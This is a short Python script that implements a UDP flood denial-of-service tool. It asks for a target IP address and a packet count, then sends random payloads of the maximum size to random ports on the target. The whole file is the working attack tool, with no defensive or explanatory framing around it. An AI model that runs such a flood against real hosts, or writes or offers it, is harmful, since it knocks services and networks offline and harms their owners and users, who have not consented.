import socket
import random

#function to flood the target given the IP address of the target
def udp_flood(target_ip, data_size, min_port, max_port, max_packets):
    try:
        #create a new socket for UDP
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error:
        print('Failed to create socket')
    print('Socket Created')

    i=0
    while i<max_packets:
            #size of data to be sent in bytes
            data=random._urandom(data_size)
            #random port number to send data
            target_port=random.randint(min_port,max_port)
            #send data to target 
            s.sendto(data, (target_ip, target_port))
            i=i+1
            print('#Packet Sent: ' + str(i)+' to port: '+str(target_port))

if __name__ == '__main__':
    #ip address of the target
    target_ip = str(input('Enter target IP: '))
    #number of packets to send
    max_packets=int(input('Enter max packets: '))
    #maximum size of the data to be sent in bytes
    data_size=65507
    #minimum port number to send data
    min_port=1
    #maximum port number to send data
    max_port=65535
    #flood the target
    udp_flood(target_ip, data_size, min_port, max_port, max_packets)
